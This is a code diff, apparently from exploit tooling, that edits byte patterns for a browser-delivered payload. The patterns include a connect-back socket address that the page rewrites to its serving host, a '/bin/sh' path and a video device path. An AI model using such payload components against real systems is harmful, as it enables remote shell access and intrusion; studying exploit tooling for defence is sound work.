@@ -27,7 +27,9 @@ JS = HERE.parent / "server" / "payloads" / "browser_payload.js"
 PATTERNS = {
     "tag": b"PHYSRPC1\0",
     "forktag": b"PHYRFORK\0",
-    "sa": b"\x02\x00\x00\x50\xc0\xa8\xb2\xd6",
+    # AF_INET, port 80, 192.0.2.1 (TEST-NET-1 placeholder; the page rewrites the
+    # IP and the port from location.hostname/location.port before the copy)
+    "sa": b"\x02\x00\x00\x50\xc0\x00\x02\x01",
     "path": b"/dev/video30\0",
     "hello": b"PGDB",
     "shpath": b"/bin/sh\0",
